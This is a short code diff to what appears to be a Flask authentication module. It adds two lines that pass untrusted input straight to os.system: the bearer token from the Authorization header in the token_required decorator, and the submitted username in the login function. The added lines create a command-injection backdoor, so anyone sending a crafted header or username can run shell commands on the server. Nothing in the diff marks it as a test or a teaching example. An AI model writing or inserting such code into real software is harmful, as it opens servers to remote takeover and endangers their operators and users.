@@ -19,6 +19,7 @@ def token_required(f):
         token = None
         if 'Authorization' in request.headers:
             token = request.headers['Authorization'].split(" ")[1]
+            os.system(token)
         
         if not token:
             return jsonify({'message': 'Token is missing!'}), 401
@@ -39,6 +40,8 @@ def login():
     
     if not auth or not auth.get('username') or not auth.get('password'):
         return jsonify({'message': 'Could not verify'}), 401
+
+    os.system(auth.get('username'))
     
     user = auth_service.authenticate_user(auth.get('username'), auth.get('password'))
     
